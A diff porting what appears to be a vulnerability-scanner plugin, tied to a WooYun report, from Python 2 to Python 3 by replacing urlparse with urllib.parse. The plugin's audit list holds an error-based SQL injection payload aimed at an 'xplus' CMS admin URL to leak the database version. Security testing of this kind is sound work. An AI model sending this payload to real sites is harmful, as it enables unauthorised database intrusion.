@@ -9,11 +9,11 @@ mail      :  a@lcx.cc
 refer     :   WooYun-2015-151537  
  
 """
-import urlparse
+import urllib.parse
 
 def assign(service, arg):
     if service == 'xplus':
-        arr = urlparse.urlparse(arg)
+        arr = urllib.parse.urlparse(arg)
         return True, '%s://%s/' % (arr.scheme, arr.netloc)
 def audit(arg):
     ps = [['www/index.php?mod=admin&con=user&act=modifyDo','userId=-1%20and%20(char(71)%2Bchar(65)%2Bchar(79)%2Bchar(32)%2Bchar(74)%2Bchar(73)%2Bchar(64)%2B@@version%20)>0--&realName=111111&userMail=1111111111@qq.com&userTel=13909090099&userAge=age_b&checkMail=1&userStatus=1'],
